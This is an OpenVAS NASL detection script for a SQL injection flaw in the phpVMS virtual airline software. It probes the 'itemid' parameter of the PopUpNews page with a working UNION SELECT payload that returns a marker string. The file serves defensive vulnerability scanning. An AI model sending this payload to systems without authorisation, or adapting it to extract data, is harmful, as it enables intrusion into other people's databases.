###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpvms_sql_inj_vuln.nasl 11449 2018-09-18 10:04:42Z mmartin $
#
# phpVMS Virtual Airline Administration SQL injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803476");
  script_version("$Revision: 11449 $");
  script_bugtraq_id(59057);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-18 12:04:42 +0200 (Tue, 18 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-04-17 10:51:22 +0530 (Wed, 17 Apr 2013)");
  script_name("phpVMS Virtual Airline Administration SQL injection Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53033");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24960");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/53033");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121306/phpvms-sql.txt");
  script_xref(name:"URL", value:"http://evilc0de.blogspot.in/2013/04/phpvms-sql-injection-vulnerability.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Flaw is due to improper sanitation of user supplied input via
  the 'itemid' parameter to /index.php/PopUpNews/popupnewsitem/ script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with phpVMS and is prone to sql injection
  vulnerability.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to disclose
  or manipulate SQL queries by injecting arbitrary SQL code.");
  script_tag(name:"affected", value:"phpVMS version 2.1.934 & 2.1.935");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/php-vms", "/phpvms", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:port);

  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) &&
                   (">phpVMS<" >< rcvRes))
  {
    url = dir + "/index.php/PopUpNews/popupnewsitem/?itemid=123+union+select+1"+
                ",0x53514c2d496e6a656374696f6e2d54657374,2,3,4--";

    if(http_vuln_check(port:port, url:url, check_header:TRUE,
          pattern:"SQL-Injection-Test"))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
